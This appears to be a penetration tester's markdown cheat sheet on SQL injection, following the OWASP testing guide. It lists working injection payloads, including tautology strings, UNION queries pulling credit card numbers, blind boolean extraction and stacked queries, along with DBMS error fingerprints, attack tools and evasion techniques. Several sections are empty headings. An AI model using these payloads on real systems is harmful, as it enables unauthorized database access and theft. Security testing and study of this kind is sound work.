# SQL inection (SQLi)

> SQL injection is a code injection technique, used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).   
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/SQL_injection)</cite>

## General

* [SQL Injection | pentestmonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
* [GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://github.com/swisskyrepo/PayloadsAllTheThings)


## OWASP: WSTG

https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection

### Recon

* Create a list of input fields 

### Enum (provoke an error)

* first test  `'` or `;`
* Comments  `--` `/* */` `#`
* Enter different type, e.g. string instead of int
* Monitor responses (Error may be hidden in JS or HTML)
* Generic Error (e.g. just 500) -> blind SQL injection 

### Injections

#### Classic

* Most basic  `1' or '1' = '1`
* Evade braces and further conditions  `1' or '1' = '1'))/*`
* App logic may expect exactly one result  `1' or '1' = '1')) LIMIT 1/*`

#### Select 

* `http://www.example.com/product.php?id=10 AND 1=2`
Error or blank page -> vulnerable

#### Stacked Queries

* `http://www.example.com/product.php?id=10; INSERT INTO users (…)`

### Fingerprinting

MySql:
```
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

Oracle:
```
ORA-00933: SQL command not properly ended
```

MS SQL Server:
```
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL:
```
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

### Exploitation 

#### Union

```sql
1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

* Determine number of columns
Increase order by number until an error occurs. 
```
http://www.example.com/product.php?id=10 ORDER BY 10--
```

* Determine data types of columns
Use null as placeholder for yet undetermined columns
```
http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--
```

* Ensure more than one result is shown
```
http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--
```

#### Boolean

Useful for blind SQL injections

* Iterate one char at a time
```
1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1
```

#### Error based

#### Out of band 

#### Time delay

#### Stored procedure 

#### Automatic / Tools

* https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection
* https://packetstormsecurity.com/files/43795/sqlbftools-1.2.tar.gz.html
* https://sqlmap.org
* https://github.com/dtrip/mysqloit

### Evasion

* Whitespaces
* Null bytes (%00)
* Inline comments
* URL encoding
* Char encoding 
* String concatenation 
* Hex encoding
* Declare variables
* Alternative expression of `'or 1=1'`
